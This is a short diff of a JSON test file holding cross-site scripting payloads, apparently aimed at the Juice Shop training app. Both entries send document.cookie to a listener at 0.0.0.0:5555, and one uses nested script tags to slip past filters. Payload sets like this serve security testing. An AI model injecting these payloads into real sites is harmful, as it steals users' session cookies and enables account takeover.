@@ -1,5 +1,5 @@
 {
-  "payloadXSS3" : {
+  "payloadJuiceShopXSS3" : {
       "id":1,
       "name":"Apple Juice (1000ml)",
       "description":"XSS Payload : <script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie</script>",
@@ -9,8 +9,8 @@
       "updatedAt":"2016-11-23 11:02:05.000 +00:00",
       "deletedAt":null
   },
-  "payloadXSS4" : {
-      "comment":"XSS Payload : <<script>alert(\"TestXSS\")</script>script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie<</script>/script>",
-      "rating":0
+  "payloadJuiceShopXSS4" : {
+    "comment": "XSS Payload : <<script>alert(\"TestXSS\")</script>script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie<</script>/script>",
+    "rating": 0
   }
 }
